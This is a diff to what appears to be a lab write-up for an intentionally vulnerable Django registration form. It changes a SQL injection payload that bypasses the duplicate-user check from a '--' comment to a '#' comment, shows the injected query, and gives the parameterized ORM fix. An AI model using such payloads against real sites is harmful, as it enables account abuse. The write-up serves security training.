@@ -112,7 +112,7 @@ The ORM uses `cursor.execute(sql, [params])` internally — equivalent to C#'s `
 
 ### Payload — bypass duplicate-user check
 ```
-username: ' AND '1'='2' -- 
+username: ' AND '1'='2'#
 email:    any valid email (e.g. test@test.com)
 password: any valid password
 ```
@@ -133,9 +133,9 @@ cursor.execute(
 ```
 With the payload the query becomes:
 ```sql
-SELECT id FROM accounts_user WHERE username='' AND '1'='2' -- ' OR email='alice@test.com'
+SELECT id FROM accounts_user WHERE username='' AND '1'='2'#' OR email='alice@test.com'
 ```
-`'1'='2'` is always false, and `--` comments out the `OR email=...` clause. The WHERE is always false — no existing user is ever found — so the duplicate check is bypassed and the INSERT proceeds.
+`'1'='2'` is always false, and `#` comments out the `OR email=...` clause. The WHERE is always false — no existing user is ever found — so the duplicate check is bypassed and the INSERT proceeds.
 
 ### Fix (secure build)
 Django ORM `User.objects.filter(username=username).exists()` — parameterized, input treated as data not SQL.
